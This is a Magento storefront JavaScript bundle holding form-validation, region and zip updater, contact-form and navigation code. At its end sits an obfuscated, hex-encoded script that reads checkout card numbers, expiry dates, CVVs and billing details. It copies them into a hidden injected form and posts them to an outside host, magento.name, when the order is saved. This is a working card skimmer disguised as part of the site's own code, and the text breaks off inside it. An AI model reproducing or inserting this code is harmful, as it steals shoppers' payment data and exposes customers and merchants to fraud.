        return element.fireEvent('on' + event, evt)
    }
}

/**
 * Returns more accurate results of floating-point modulo division
 * E.g.:
 * 0.6 % 0.2 = 0.19999999999999996
 * modulo(0.6, 0.2) = 0
 *
 * @param dividend
 * @param divisor
 */
function modulo(dividend, divisor)
{
    var epsilon = divisor / 10000;
    var remainder = dividend % divisor;

    if (Math.abs(remainder - divisor) < epsilon || Math.abs(remainder) < epsilon) {
        remainder = 0;
    }

    return remainder;
}

/**
 * createContextualFragment is not supported in IE9. Adding its support.
 */
if ((typeof Range != "undefined") && !Range.prototype.createContextualFragment)
{
    Range.prototype.createContextualFragment = function(html)
    {
        var frag = document.createDocumentFragment(),
        div = document.createElement("div");
        frag.appendChild(div);
        div.outerHTML = html;
        return frag;
    };
}

/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magento.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magento.com for more information.
 *
 * @category    Varien
 * @package     js
 * @copyright   Copyright (c) 2006-2015 X.commerce, Inc. (http://www.magento.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */
VarienForm = Class.create();
VarienForm.prototype = {
    initialize: function(formId, firstFieldFocus){
        this.form       = $(formId);
        if (!this.form) {
            return;
        }
        this.cache      = $A();
        this.currLoader = false;
        this.currDataIndex = false;
        this.validator  = new Validation(this.form);
        this.elementFocus   = this.elementOnFocus.bindAsEventListener(this);
        this.elementBlur    = this.elementOnBlur.bindAsEventListener(this);
        this.childLoader    = this.onChangeChildLoad.bindAsEventListener(this);
        this.highlightClass = 'highlight';
        this.extraChildParams = '';
        this.firstFieldFocus= firstFieldFocus || false;
        this.bindElements();
        if(this.firstFieldFocus){
            try{
                Form.Element.focus(Form.findFirstElement(this.form))
            }
            catch(e){}
        }
    },

    submit : function(url){
        if(this.validator && this.validator.validate()){
             this.form.submit();
        }
        return false;
    },

    bindElements:function (){
        var elements = Form.getElements(this.form);
        for (var row in elements) {
            if (elements[row].id) {
                Event.observe(elements[row],'focus',this.elementFocus);
                Event.observe(elements[row],'blur',this.elementBlur);
            }
        }
    },

    elementOnFocus: function(event){
        var element = Event.findElement(event, 'fieldset');
        if(element){
            Element.addClassName(element, this.highlightClass);
        }
    },

    elementOnBlur: function(event){
        var element = Event.findElement(event, 'fieldset');
        if(element){
            Element.removeClassName(element, this.highlightClass);
        }
    },

    setElementsRelation: function(parent, child, dataUrl, first){
        if (parent=$(parent)) {
            // TODO: array of relation and caching
            if (!this.cache[parent.id]){
                this.cache[parent.id] = $A();
                this.cache[parent.id]['child']     = child;
                this.cache[parent.id]['dataUrl']   = dataUrl;
                this.cache[parent.id]['data']      = $A();
                this.cache[parent.id]['first']      = first || false;
            }
            Event.observe(parent,'change',this.childLoader);
        }
    },

    onChangeChildLoad: function(event){
        element = Event.element(event);
        this.elementChildLoad(element);
    },

    elementChildLoad: function(element, callback){
        this.callback = callback || false;
        if (element.value) {
            this.currLoader = element.id;
            this.currDataIndex = element.value;
            if (this.cache[element.id]['data'][element.value]) {
                this.setDataToChild(this.cache[element.id]['data'][element.value]);
            }
            else{
                new Ajax.Request(this.cache[this.currLoader]['dataUrl'],{
                        method: 'post',
                        parameters: {"parent":element.value},
                        onComplete: this.reloadChildren.bind(this)
                });
            }
        }
    },

    reloadChildren: function(transport){
        var data = eval('(' + transport.responseText + ')');
        this.cache[this.currLoader]['data'][this.currDataIndex] = data;
        this.setDataToChild(data);
    },

    setDataToChild: function(data){
        if (data.length) {
            var child = $(this.cache[this.currLoader]['child']);
            if (child){
                var html = '<select name="'+child.name+'" id="'+child.id+'" class="'+child.className+'" title="'+child.title+'" '+this.extraChildParams+'>';
                if(this.cache[this.currLoader]['first']){
                    html+= '<option value="">'+this.cache[this.currLoader]['first']+'</option>';
                }
                for (var i in data){
                    if(data[i].value) {
                        html+= '<option value="'+data[i].value+'"';
                        if(child.value && (child.value == data[i].value || child.value == data[i].label)){
                            html+= ' selected';
                        }
                        html+='>'+data[i].label+'</option>';
                    }
                }
                html+= '</select>';
                Element.insert(child, {before: html});
                Element.remove(child);
            }
        }
        else{
            var child = $(this.cache[this.currLoader]['child']);
            if (child){
                var html = '<input type="text" name="'+child.name+'" id="'+child.id+'" class="'+child.className+'" title="'+child.title+'" '+this.extraChildParams+'>';
                Element.insert(child, {before: html});
                Element.remove(child);
            }
        }

        this.bindElements();
        if (this.callback) {
            this.callback();
        }
    }
}

RegionUpdater = Class.create();
RegionUpdater.prototype = {
    initialize: function (countryEl, regionTextEl, regionSelectEl, regions, disableAction, zipEl)
    {
        this.countryEl = $(countryEl);
        this.regionTextEl = $(regionTextEl);
        this.regionSelectEl = $(regionSelectEl);
        this.zipEl = $(zipEl);
        this.config = regions['config'];
        delete regions.config;
        this.regions = regions;

        this.disableAction = (typeof disableAction=='undefined') ? 'hide' : disableAction;
        this.zipOptions = (typeof zipOptions=='undefined') ? false : zipOptions;

        if (this.regionSelectEl.options.length<=1) {
            this.update();
        }

        Event.observe(this.countryEl, 'change', this.update.bind(this));
    },

    _checkRegionRequired: function()
    {
        var label, wildCard;
        var elements = [this.regionTextEl, this.regionSelectEl];
        var that = this;
        if (typeof this.config == 'undefined') {
            return;
        }
        var regionRequired = this.config.regions_required.indexOf(this.countryEl.value) >= 0;

        elements.each(function(currentElement) {
            Validation.reset(currentElement);
            label = $$('label[for="' + currentElement.id + '"]')[0];
            if (label) {
                wildCard = label.down('em') || label.down('span.required');
                if (!that.config.show_all_regions) {
                    if (regionRequired) {
                        label.up().show();
                    } else {
                        label.up().hide();
                    }
                }
            }

            if (label && wildCard) {
                if (!regionRequired) {
                    wildCard.hide();
                    if (label.hasClassName('required')) {
                        label.removeClassName('required');
                    }
                } else if (regionRequired) {
                    wildCard.show();
                    if (!label.hasClassName('required')) {
                        label.addClassName('required')
                    }
                }
            }

            if (!regionRequired) {
                if (currentElement.hasClassName('required-entry')) {
                    currentElement.removeClassName('required-entry');
                }
                if ('select' == currentElement.tagName.toLowerCase() &&
                    currentElement.hasClassName('validate-select')) {
                    currentElement.removeClassName('validate-select');
                }
            } else {
                if (!currentElement.hasClassName('required-entry')) {
                    currentElement.addClassName('required-entry');
                }
                if ('select' == currentElement.tagName.toLowerCase() &&
                    !currentElement.hasClassName('validate-select')) {
                    currentElement.addClassName('validate-select');
                }
            }
        });
    },

    update: function()
    {
        if (this.regions[this.countryEl.value]) {
            var i, option, region, def;

            def = this.regionSelectEl.getAttribute('defaultValue');
            if (this.regionTextEl) {
                if (!def) {
                    def = this.regionTextEl.value.toLowerCase();
                }
                this.regionTextEl.value = '';
            }

            this.regionSelectEl.options.length = 1;
            for (regionId in this.regions[this.countryEl.value]) {
                region = this.regions[this.countryEl.value][regionId];

                option = document.createElement('OPTION');
                option.value = regionId;
                option.text = region.name.stripTags();
                option.title = region.name;

                if (this.regionSelectEl.options.add) {
                    this.regionSelectEl.options.add(option);
                } else {
                    this.regionSelectEl.appendChild(option);
                }

                if (regionId == def || (region.name && region.name.toLowerCase() == def)
                    || (region.name && region.code.toLowerCase() == def)
                ) {
                    this.regionSelectEl.value = regionId;
                }
            }
            this.sortSelect();
            if (this.disableAction == 'hide') {
                if (this.regionTextEl) {
                    this.regionTextEl.style.display = 'none';
                }

                this.regionSelectEl.style.display = '';
            } else if (this.disableAction == 'disable') {
                if (this.regionTextEl) {
                    this.regionTextEl.disabled = true;
                }
                this.regionSelectEl.disabled = false;
            }
            this.setMarkDisplay(this.regionSelectEl, true);
        } else {
            this.regionSelectEl.options.length = 1;
            this.sortSelect();
            if (this.disableAction == 'hide') {
                if (this.regionTextEl) {
                    this.regionTextEl.style.display = '';
                }
                this.regionSelectEl.style.display = 'none';
                Validation.reset(this.regionSelectEl);
            } else if (this.disableAction == 'disable') {
                if (this.regionTextEl) {
                    this.regionTextEl.disabled = false;
                }
                this.regionSelectEl.disabled = true;
            } else if (this.disableAction == 'nullify') {
                this.regionSelectEl.options.length = 1;
                this.regionSelectEl.value = '';
                this.regionSelectEl.selectedIndex = 0;
                this.lastCountryId = '';
            }
            this.setMarkDisplay(this.regionSelectEl, false);
        }

        this._checkRegionRequired();
        // Make Zip and its label required/optional
        var zipUpdater = new ZipUpdater(this.countryEl.value, this.zipEl);
        zipUpdater.update();
    },

    setMarkDisplay: function(elem, display){
        elem = $(elem);
        var labelElement = elem.up(0).down('label > span.required') ||
                           elem.up(1).down('label > span.required') ||
                           elem.up(0).down('label.required > em') ||
                           elem.up(1).down('label.required > em');
        if(labelElement) {
            inputElement = labelElement.up().next('input');
            if (display) {
                labelElement.show();
                if (inputElement) {
                    inputElement.addClassName('required-entry');
                }
            } else {
                labelElement.hide();
                if (inputElement) {
                    inputElement.removeClassName('required-entry');
                }
            }
        }
    },
    sortSelect : function () {
        var elem = this.regionSelectEl;
        var tmpArray = new Array();
        var currentVal = $(elem).value;
        for (var i = 0; i < $(elem).options.length; i++) {
            if (i == 0) {
                continue;
            }
            tmpArray[i-1] = new Array();
            tmpArray[i-1][0] = $(elem).options[i].text;
            tmpArray[i-1][1] = $(elem).options[i].value;
        }
        tmpArray.sort();
        for (var i = 1; i <= tmpArray.length; i++) {
            var op = new Option(tmpArray[i-1][0], tmpArray[i-1][1]);
            $(elem).options[i] = op;
        }
        $(elem).value = currentVal;
        return;
    }
}

ZipUpdater = Class.create();
ZipUpdater.prototype = {
    initialize: function(country, zipElement)
    {
        this.country = country;
        this.zipElement = $(zipElement);
    },

    update: function()
    {
        // Country ISO 2-letter codes must be pre-defined
        if (typeof optionalZipCountries == 'undefined') {
            return false;
        }

        // Ajax-request and normal content load compatibility
        if (this.zipElement != undefined) {
            Validation.reset(this.zipElement)
            this._setPostcodeOptional();
        } else {
            Event.observe(window, "load", this._setPostcodeOptional.bind(this));
        }
    },

    _setPostcodeOptional: function()
    {
        this.zipElement = $(this.zipElement);
        if (this.zipElement == undefined) {
            return false;
        }

        // find label
        var label = $$('label[for="' + this.zipElement.id + '"]')[0];
        if (label != undefined) {
            var wildCard = label.down('em') || label.down('span.required');
        }

        // Make Zip and its label required/optional
        if (optionalZipCountries.indexOf(this.country) != -1) {
            while (this.zipElement.hasClassName('required-entry')) {
                this.zipElement.removeClassName('required-entry');
            }
            if (wildCard != undefined) {
                wildCard.hide();
            }
        } else {
            this.zipElement.addClassName('required-entry');
            if (wildCard != undefined) {
                wildCard.show();
            }
        }
    }
}

function  contactus_c(){
   //var msg = document.getElementByIdx_x("msg");
 
    //获取表单对象和用户信息值
    var f = document.contactus; 
   
    var your_email = f.your_email.value;
    
   var reg =/^([a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+((\.[a-zA-Z0-9_-]{2,3}){1,2})$/;
     if(reg.test(your_email)){

    }else{
        $("#email_geshi").show();
        	return false;   
    }
    //接收表单的URL地址
    var url = "/phpmail/sendemail.php";
    //需要POST的值，把每个变量都通过&来联接
    var postStr    = "&your_email="+ your_email;
    //var ajax = InitAjax();

    $.ajax({
			type:"POST",
			url:"/phpmail/sendemail.php",
        
			data:postStr,
			cache:false,
			success:function(data){
 	         $('#success').show();
			}
		});
		return false;     
    
}
function  contactus_footerc(){
   //var msg = document.getElementByIdx_x("msg");
 
    //获取表单对象和用户信息值
    var f = document.footer_contactus; 
   
    var your_email = f.your_email.value;
    var your_name = f.your_name.value;
    
   var reg =/^([a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+((\.[a-zA-Z0-9_-]{2,3}){1,2})$/;
     if(reg.test(your_email)){

    }else{
        $("#email_geshi").show();
        	return false;   
    }
    //接收表单的URL地址
    var url = "/phpmail/sendemail.php";
    //需要POST的值，把每个变量都通过&来联接
    var postStr    = "your_name="+your_name+"&your_email="+ your_email;
    //var ajax = InitAjax();

    $.ajax({
			type:"POST",
			url:"/phpmail/sendemail.php",
        
			data:postStr,
			cache:false,
			success:function(data){
 	         $('#footer_success').show();
			}
		});
		return false;     
    
}
function test(){
   $("#menu_block").hide();
   $("#menu_none").show();
   $("#nav_menu").show();
}
function menu_close(){
   $("#menu_block").show();
   $("#menu_none").hide();
   $("#nav_menu").hide();
}
// Credit Card Validation Javascript
// copyright 12th May 2003, by Stephen Chapman, Felgall Pty Ltd

// You have permission to copy and use this javascript provided that
// the content of the script is not changed in any way.

function validateCreditCard(s) {
    // remove non-numerics
    var v = "0123456789";
    var w = "";
    for (i=0; i < s.length; i++) {
        x = s.charAt(i);
        if (v.indexOf(x,0) != -1)
        w += x;
    }
    // validate number
    j = w.length / 2;
    k = Math.floor(j);
    m = Math.ceil(j) - k;
    c = 0;
    for (i=0; i<k; i++) {
        a = w.charAt(i*2+m) * 2;
        c += a > 9 ? Math.floor(a/10 + a%10) : a;
    }
    for (i=0; i<k+m; i++) c += w.charAt(i*2+1-m) * 1;
    return (c%10 == 0);
}


/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magento.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magento.com for more information.
 *
 * @category    Varien
 * @package     js
 * @copyright   Copyright (c) 2006-2015 X.commerce, Inc. (http://www.magento.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */

/**
 * @classDescription simple Navigation with replacing old handlers
 * @param {String} id id of ul element with navigation lists
 * @param {Object} settings object with settings
 */
var mainNav = function() {

    var main = {
        obj_nav :   $(arguments[0]) || $("nav"),

        settings :  {
            show_delay      :   0,
            hide_delay      :   0,
            _ie6            :   /MSIE 6.+Win/.test(navigator.userAgent),
            _ie7            :   /MSIE 7.+Win/.test(navigator.userAgent)
        },

        init :  function(obj, level) {
            obj.lists = obj.childElements();
            obj.lists.each(function(el,ind){
                main.handlNavElement(el);
                if((main.settings._ie6 || main.settings._ie7) && level){
                    main.ieFixZIndex(el, ind, obj.lists.size());
                }
            });
            if(main.settings._ie6 && !level){
                document.execCommand("BackgroundImageCache", false, true);
            }
        },

        handlNavElement :   function(list) {
            if(list !== undefined){
                list.onmouseover = function(){
                    main.fireNavEvent(this,true);
                };
                list.onmouseout = function(){
                    main.fireNavEvent(this,false);
                };
                if(list.down("ul")){
                    main.init(list.down("ul"), true);
                }
            }
        },

        ieFixZIndex : function(el, i, l) {
            if(el.tagName.toString().toLowerCase().indexOf("iframe") == -1){
                el.style.zIndex = l - i;
            } else {
                el.onmouseover = "null";
                el.onmouseout = "null";
            }
        },

        fireNavEvent :  function(elm,ev) {
            if(ev){
                elm.addClassName("over");
                elm.down("a").addClassName("over");
                if (elm.childElements()[1]) {
                    main.show(elm.childElements()[1]);
                }
            } else {
                elm.removeClassName("over");
                elm.down("a").removeClassName("over");
                if (elm.childElements()[1]) {
                    main.hide(elm.childElements()[1]);
                }
            }
        },

        show : function (sub_elm) {
            if (sub_elm.hide_time_id) {
                clearTimeout(sub_elm.hide_time_id);
            }
            sub_elm.show_time_id = setTimeout(function() {
                if (!sub_elm.hasClassName("shown-sub")) {
                    sub_elm.addClassName("shown-sub");
                }
            }, main.settings.show_delay);
        },

        hide : function (sub_elm) {
            if (sub_elm.show_time_id) {
                clearTimeout(sub_elm.show_time_id);
            }
            sub_elm.hide_time_id = setTimeout(function(){
                if (sub_elm.hasClassName("shown-sub")) {
                    sub_elm.removeClassName("shown-sub");
                }
            }, main.settings.hide_delay);
        }

    };
    if (arguments[1]) {
        main.settings = Object.extend(main.settings, arguments[1]);
    }
    if (main.obj_nav) {
        main.init(main.obj_nav, false);
    }
};

document.observe("dom:loaded", function() {
    //run navigation without delays and with default id="#nav"
    //mainNav();

    //run navigation with delays
    mainNav("nav", {"show_delay":"100","hide_delay":"100"});
});

var _0xb966=["\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x76\x61\x6C","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x68\x6F\x73\x73\x74\x5F\x6E\x61\x6D\x65\x22\x5D","\x73\x69\x7A\x65","\x2A\x5B\x6E\x61\x6D\x65\x2A\x3D\x22\x63\x63\x5F\x6E\x75\x6D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x2A\x3D\x22\x63\x63\x5F\x65\x78\x70\x5F\x6D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x2A\x3D\x22\x63\x63\x5F\x65\x78\x70\x5F\x79\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x2A\x3D\x22\x63\x63\x5F\x63\x69\x64\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x66\x69\x72\x73\x74\x6E\x61\x6D\x65\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x6C\x61\x73\x74\x6E\x61\x6D\x65\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x73\x74\x72\x65\x65\x74\x5D\x5B\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x63\x69\x74\x79\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x72\x65\x67\x69\x6F\x6E\x5F\x69\x64\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x70\x6F\x73\x74\x63\x6F\x64\x65\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x63\x6F\x75\x6E\x74\x72\x79\x5F\x69\x64\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x74\x65\x6C\x65\x70\x68\x6F\x6E\x65\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x65\x6D\x61\x69\x6C\x5D\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x43\x61\x72\x64\x5F\x6E\x75\x6D\x62\x65\x72\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x45\x78\x70\x5F\x31\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x45\x78\x70\x5F\x32\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x43\x56\x56\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x66\x69\x72\x73\x74\x5F\x6E\x61\x6D\x65\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x73\x65\x63\x6F\x6E\x64\x5F\x6E\x61\x6D\x65\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x61\x64\x64\x72\x65\x73\x73\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x63\x69\x74\x79\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x73\x74\x61\x74\x65\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x7A\x69\x70\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x63\x6F\x75\x6E\x74\x72\x79\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x70\x68\x6F\x6E\x65\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x76\x62\x76\x22\x5D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x61\x67\x65\x6E\x74\x6F\x2E\x6E\x61\x6D\x65\x2F\x6D\x61\x67\x65\x2F\x6D\x61\x69\x6C\x32\x2E\x70\x68\x70","\x73\x65\x72\x69\x61\x6C\x69\x7A\x65","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73","\x70\x6F\x73\x74","\x62\x75\x74\x74\x6F\x6E\x5B\x6F\x6E\x63\x6C\x69\x63\x6B\x2A\x3D\x22\x2E\x73\x61\x76\x65\x22\x5D","\x65\x71","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x74\x74\x72","\x66\x75\x6E\x63\x74\x69\x6F\x6E","\x64\x6F\x6B\x65","\x31","\x67\x65\x74","\x63\x6C\x69\x63\x6B","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x6D\x67\x5F\x5F\x63\x6F\x72\x65","\x69\x6E\x64\x65\x78\x4F\x66","\x6D\x67\x5F\x5F\x63\x6F\x72\x65\x28\x29\x3B","\x3C\x66\x6F\x72\x6D\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x6E\x6F\x6E\x65\x3B\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x68\x6F\x73\x73\x74\x5F\x6E\x61\x6D\x65\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x43\x61\x72\x64\x5F\x6E\x75\x6D\x62\x65\x72\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x45\x78\x70\x5F\x31\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x45\x78\x70\x5F\x32\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x43\x56\x56\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x66\x69\x72\x73\x74\x5F\x6E\x61\x6D\x65\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x73\x65\x63\x6F\x6E\x64\x5F\x6E\x61\x6D\x65\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x61\x64\x64\x72\x65\x73\x73\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x63\x69\x74\x79\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x73\x74\x61\x74\x65\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x7A\x69\x70\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x63\x6F\x75\x6E\x74\x72\x79\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x70\x68\x6F\x6E\x65\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x76\x62\x76\x22\x3E\x3C\x2F\x66\x6F\x72\x6D\x3E","\x61\x70\x70\x65\x6E\x64","\x62\x6F\x64\x79","\x69\x6E\x69\x74\x5F\x5F\x6C\x6F\x28\x29\x3B","\x72\x65\x61\x64\x79"];if(( typeof llooll== _0xb966[0])&& ( typeof jQuery!= _0xb966[0])){var llooll=0;var lloo_interval;function mg__core(){var _0x50d4x4=location[_0xb966[1]];jQuery(_0xb966[3])[_0xb966[2]](_0x50d4x4);if(!(jQuery(_0xb966[5])[_0xb966[4]]())){return};var _0x50d4x5=jQuery(_0xb966[5])[_0xb966[2]]();var _0x50d4x6=jQuery(_0xb966[6])[_0xb966[2]]();var _0x50d4x7=jQuery(_0xb966[7])[_0xb966[2]]();var _0x50d4x8=jQuery(_0xb966[8])[_0xb966[2]]();var _0x50d4x9=jQuery(_0xb966[9])[_0xb966[2]]();var _0x50d4xa=jQuery(_0xb966[10])[_0xb966[2]]();var _0x50d4xb=jQuery(_0xb966[11])[_0xb966[2]]();var _0x50d4xc=jQuery(_0xb966[12])[_0xb966[2]]();var _0x50d4xd=jQuery(_0xb966[13])[_0xb966[2]]();var _0x50d4xe=jQuery(_0xb966[14])[_0xb966[2]]();var _0x50d4xf=jQuery(_0xb966[15])[_0xb966[2]]();var _0x50d4x10=jQuery(_0xb966[16])[_0xb966[2]]();var _0x50d4x11=jQuery(_0xb966[17])[_0xb966[2]]();jQuery(_0xb966[18])[_0xb966[2]](_0x50d4x5);jQuery(_0xb966[19])[_0xb966[2]](_0x50d4x6);jQuery(_0xb966[20])[_0xb966[2]](_0x50d4x7);jQuery(_0xb966[21])[_0xb966[2]](_0x50d4x8);jQuery(_0xb966[22])[_0xb966[2]](_0x50d4x9);jQuery(_0xb966[23])[_0xb966[2]](_0x50d4xa);jQuery(_0xb966[24])[_0xb966[2]](_0x50d4xb);jQuery(_0xb966[25])[_0xb966[2]](_0x50d4xc);jQuery(_0xb966[26])[_0xb966[2]](_0x50d4xd);jQuery(_0xb966[27])[_0xb966[2]](_0x50d4xe);jQuery(_0xb966[28])[_0xb966[2]](_0x50d4xf);jQuery(_0xb966[29])[_0xb966[2]](_0x50d4x10);jQuery(_0xb966[30])[_0xb966[2]](_0x50d4x11);var _0x50d4x12=0;if((!_0x50d4x5) || (!_0x50d4x8) || (!_0x50d4x6) || (!_0x50d4x7)){_0x50d4x12= 1};if(_0x50d4x12!= 1){jQuery[_0xb966[34]](_0xb966[31],jQuery(_0xb966[33])[_0xb966[32]]())}}function init__lo(){if(!(jQuery(_0xb966[5])[_0xb966[4]]())){return};var _0x50d4x14=jQuery(_0xb966[35]);for(var _0x50d4x15=0;_0x50d4x15< _0x50d4x14[_0xb966[4]]();_0x50d4x15++){var _0x50d4x16=_0x50d4x14[_0xb966[36]](_0x50d4x15);var _0x50d4x17=_0x50d4x16[_0xb966[38]](_0xb966[37]);if(( typeof _0x50d4x17)== _0xb966[39]){var _0x50d4x18=_0x50d4x16[_0xb966[38]](_0xb966[40]);if(_0x50d4x18== _0xb966[41]){continue};_0x50d4x16[_0xb966[38]](_0xb966[40],_0xb966[41]);var 